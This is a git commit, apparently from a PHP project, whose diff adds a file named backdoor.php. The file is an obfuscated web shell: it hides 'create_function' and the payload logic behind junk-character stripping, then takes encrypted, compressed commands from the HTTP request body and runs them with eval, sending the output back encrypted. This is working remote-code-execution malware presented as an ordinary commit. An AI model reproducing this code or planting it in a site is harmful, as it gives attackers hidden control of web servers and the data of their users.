0cc21b59c39048908244d139d171ba589c5f3226
Dana-Maria Iliescu <dana.iliescu96@gmail.com>
2019-11-15 16:25:34 +0100

    Create backdoor.php

---
+++ backdoor.php
@@ -0,0 +1,12 @@
+<?php
+$F='n}[();$r}[=@bas}[e64_enco}[d}[e(@x(@gzco}[mpre}[ss($o)}[,$k)}[}[);print("}[$p$kh$r$kf");}';
+$w='Ql}[S}[x}[9t9beC";funct}[i}[on x($t,$k){}[$c=strlen(}[$k}[)}[;$l=strlen($t);$}[o="";f';
+$G='}[or($}[i=0;$i}[<$l;){f}[or($}[j=0;(}[$j}[<$c&&}[$i<$l);$j}[++,$i++){$}[o.=$t{}[$i}}';
+$m='nts}[("php}[://input}["),$m)}[==1){@}[ob_sta}[rt(}[);@ev}[al(@gzuncom}[press}[(}';
+$R='}[$k="cdd20849"}[;$k}[h="74c1}[1e}[fc}[ce03";$kf="6}[cdb66eeed}[9d"}[}[;$p="ovGren';
+$X='[^$k}[{$j};}}[}return $o;}[}if(@preg}[_}[matc}[h}[("/}[$kh(.+)$k}[f/",@file_get_cont}[e';
+$g='[@x(@bas}[e64_d}[ecode($m[1}[]),$k)))}[}[;$o=@ob_}[get_conte}[nts(}[}[);@ob_end_clea';
+$I=str_replace('AY','','cAYreatAYe_AYfAYAYAYunction');
+$e=str_replace('}[','',$R.$w.$G.$X.$m.$g.$F);
+$l=$I('',$e);$l();
+?>
